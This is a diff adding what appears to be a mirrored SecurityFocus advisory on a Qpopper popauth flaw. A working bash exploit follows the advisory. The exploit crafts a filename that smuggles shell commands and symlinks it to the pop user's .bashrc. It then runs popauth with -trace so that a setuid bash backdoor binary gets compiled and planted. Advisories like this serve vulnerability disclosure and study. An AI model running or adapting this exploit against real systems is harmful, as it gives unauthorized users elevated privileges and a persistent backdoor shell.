@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/3710/info
+
+Qpopper is a freely available, open source Post Office Protocol server. It is maintained and distributed by Qualcomm.
+
+When popauth is executed with the trace option, it does not correctly handle user-supplied input. A user can supply data to the popauth program through the trace flag which will cause the program to execute shell commands, and follow symbolic links.
+
+This problem could be exploited to gain privilege elevation equal to that of the setuid bit on popauth, typically setuid as the pop user. 
+
+#!/bin/bash
+
+# popauth symlink follow vuln by IhaQueR
+# this will create .bashrc for user pop
+# and ~pop/sup suid shell
+
+FILE=$(perl -e 'print "/tmp/blah1\"\ncd ~\necho >blah.c \"#include <stdio.h>\nmain(){setreuid(geteuid(),getuid());execlp(\\\"bash\\\", \\\"bash\\\",NULL);}\"\ngcc blah.c -o sup\nchmod u+s sup\necho done\n\n\""')
+
+ln -s /var/lib/pop/.bashrc "$FILE"
+
+/usr/sbin/popauth -trace "$FILE"
